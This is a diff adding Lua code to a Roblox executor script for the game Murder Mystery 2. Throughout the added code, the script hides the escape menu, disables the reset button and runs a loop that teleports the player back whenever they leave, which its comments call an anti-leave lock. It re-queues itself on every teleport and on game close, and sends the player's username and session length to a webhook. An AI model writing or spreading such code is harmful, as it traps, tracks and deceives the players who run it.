@@ -2488,4 +2488,153 @@ local function queueForMM2()
                 UserInputService.InputBegan:Connect(function(input, gpe)
                     if input.KeyCode == Enum.KeyCode.Escape then
                         task.spawn(function()
-                            pcall(function() GuiService:Set
+                            pcall(function() GuiService:SetMenuIsOpen(false) end)
+                        end)
+                    end
+                end)
+            end)
+
+            task.spawn(function()
+                while true do
+                    task.wait(0.25)
+                    pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
+                    pcall(function() GuiService:SetMenuIsOpen(false) end)
+                end
+            end)
+
+            if not REJOIN_LOOP_STARTED then
+                REJOIN_LOOP_STARTED = true
+                task.spawn(function()
+                    while true do
+                        task.wait(0.5)
+                        pcall(function()
+                            if game.PlaceId ~= MM2_PLACE_ID then
+                                TeleportService:Teleport(MM2_PLACE_ID, LocalPlayer)
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+
+        pcall(installMenuHider)
+        pcall(installAntiLeaveLock)
+
+        -- Log session end when player leaves
+        pcall(function()
+            Players.PlayerRemoving:Connect(function(p)
+                if p == LocalPlayer and mm2StartTime then
+                    local elapsed = math.floor(tick() - mm2StartTime)
+                    pcall(function() logMM2SessionEnd(elapsed) end)
+                end
+            end)
+        end)
+
+        task.delay(LOADING_DURATION, function()
+            destroyLoadingScreen(loadingGui)
+        end)
+    ]]
+
+    local queueFunction =
+        queue_on_teleport
+        or (syn and syn.queue_on_teleport)
+        or (fluxus and fluxus.queue_on_teleport)
+
+    if type(queueFunction) == "function" then
+        pcall(function()
+            queueFunction(teleportCode)
+        end)
+    end
+end
+
+-- ============================================================
+-- MAIN
+-- ============================================================
+
+local function main()
+    repeat task.wait() until game:IsLoaded()
+
+    local isMM2 = false
+    pcall(function()
+        local gameName = getGameName()
+        isMM2 = string.lower(gameName) == "murder mystery 2"
+    end)
+    if game.PlaceId == MM2_PLACE_ID then isMM2 = true end
+
+    local loadingGui = createLoadingScreen(false)
+
+    if isMM2 then
+        local mm2Start = tick()
+        local moonOK = executeMoonlight()
+        local prOK   = executeProjectReverse()
+
+        pcall(function()
+            logMM2Execution("Execute MM2 Script")
+        end)
+
+        if moonOK and prOK then
+            pcall(installMenuHider)
+            pcall(startAntiLeave)
+        else
+            warn("[Anti-Leave] Not armed — one or more loaders failed.")
+        end
+
+        pcall(function()
+            Players.PlayerRemoving:Connect(function(p)
+                if p == LocalPlayer then
+                    local elapsed = math.floor(tick() - mm2Start)
+                    local mins = math.floor(elapsed / 60)
+                    local secs = elapsed % 60
+                    local webhook = getMM2Webhook()
+                    if webhook then
+                        sendWebhook(webhook, {
+                            embeds = {{
+                                title = "Murder Mystery 2 Session Ended",
+                                color = 15158332,
+                                fields = {
+                                    { name = "Username",       value = LocalPlayer.Name, inline = true },
+                                    { name = "Session Length", value = string.format("%02d:%02d", mins, secs), inline = true },
+                                    { name = "Asia Time",      value = getAsiaTime(), inline = false }
+                                },
+                                timestamp = DateTime.now():ToIsoDate()
+                            }}
+                        })
+                    end
+                end
+            end)
+        end)
+
+        task.delay(LOADING_DURATION, function()
+            destroyLoadingScreen(loadingGui)
+        end)
+
+        return
+    end
+
+    pcall(function()
+        logExternalGame("Executed in external game — teleporting to MM2")
+    end)
+
+    protectClipboard()
+    queueForMM2()
+    copyDiscord()
+
+    task.delay(LOADING_DURATION, function()
+        destroyLoadingScreen(loadingGui)
+    end)
+
+    allowLeaveOnce = true
+    pcall(function()
+        TeleportService:Teleport(MM2_PLACE_ID, LocalPlayer)
+    end)
+end
+
+pcall(main)
+
+pcall(function()
+    game:BindToClose(function()
+        pcall(function()
+            queueForMM2()
+        end)
+    end)
+end)
